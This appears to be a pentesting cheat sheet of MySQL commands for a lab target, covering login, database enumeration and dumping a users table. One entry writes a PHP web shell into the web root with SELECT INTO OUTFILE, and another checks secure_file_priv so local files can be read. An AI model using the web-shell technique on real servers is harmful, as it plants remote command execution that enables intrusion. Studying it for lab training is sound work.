# mysql command examples

OS: Linux
Description: List of MySQL Commands
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: mysql (https://www.notion.so/mysql-1444c8e523768019a5acd8abdc5f59f6?pvs=21)

| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| --- | --- |

| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| --- | --- |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |

| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
| --- | --- |
| `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |